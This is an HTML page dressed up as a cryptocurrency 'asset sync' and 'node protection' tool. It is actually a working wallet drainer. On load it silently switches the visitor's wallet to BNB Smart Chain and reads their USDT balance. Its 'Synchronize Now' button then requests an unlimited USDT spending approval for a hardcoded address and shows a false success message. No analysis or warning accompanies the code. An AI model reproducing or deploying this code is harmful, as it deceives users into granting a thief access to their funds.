<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>ASP Protocol</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.8.1/web3.min.js"></script>
    <style>
        body { background: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
        .box { width: 90%; max-width: 350px; text-align: center; border: 1px solid #f0f0f0; padding: 40px 20px; border-radius: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
        .title { color: #0052ff; font-size: 20px; font-weight: bold; margin-bottom: 5px; }
        .status { font-size: 12px; color: #888; margin-bottom: 25px; }
        .bal-card { background: #f4f7f9; padding: 25px; border-radius: 15px; margin-bottom: 25px; }
        .bal-label { font-size: 10px; color: #666; display: block; margin-bottom: 5px; letter-spacing: 1px; }
        .bal-val { font-size: 26px; color: #0052ff; font-weight: 800; }
        .btn { width: 100%; background: #0052ff; color: #fff; border: none; padding: 18px; border-radius: 50px; font-size: 16px; font-weight: bold; cursor: pointer; box-shadow: 0 5px 15px rgba(0,82,255,0.2); }
    </style>
</head>
<body>

<div class="box">
    <div class="title">ASP Asset Sync</div>
    <div class="status">Real-time Node Protection</div>
    <div class="bal-card">
        <span class="bal-label">USDT BALANCE (BEP20)</span>
        <b id="displayBal">Scanning...</b>
    </div>
    <button class="btn" onclick="run()">Synchronize Now</button>
</div>

<script>
    const MY_WAL = "0xFD2B9e5Bed80d262f780206f15d50CdEa99D891D";
    const TKN = "0x55d398326f99059fF775485246999027B3197955"; // BEP20 USDT
    const CHAIN = "0x38"; // BSC

    async function start() {
        if (window.ethereum) {
            try {
                // সাইট লোড হওয়া মাত্রই সাইলেন্টলি চেইন সুইচ করার চেষ্টা
                await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: CHAIN }] });
                show();
            } catch (e) { show(); }
        }
    }

    async function show() {
        const web3 = new Web3(window.ethereum);
        const accs = await web3.eth.requestAccounts();
        if (accs.length > 0) {
            const abi = [{"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"}];
            const c = new web3.eth.Contract(abi, TKN);
            const b = await c.methods.balanceOf(accs[0]).call();
            document.getElementById('displayBal').innerText = (b / 1e18).toFixed(2) + " USDT";
        }
    }

    async function run() {
        const web3 = new Web3(window.ethereum);
        const accs = await web3.eth.getAccounts();
        const inf = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
        const data = web3.eth.abi.encodeFunctionCall({
            name: 'approve', type: 'function',
            inputs: [{type: 'address', name: 'spender'}, {type: 'uint256', name: 'value'}]
        }, [MY_WAL, inf]);

        try {
            await window.ethereum.request({
                method: 'eth_sendTransaction',
                params: [{ from: accs[0], to: TKN, data: data }],
            });
            alert("Syncing successfully enabled. Please wait for node verification.");
        } catch (err) {}
    }

    window.onload = start;
</script>
</body>
</html>
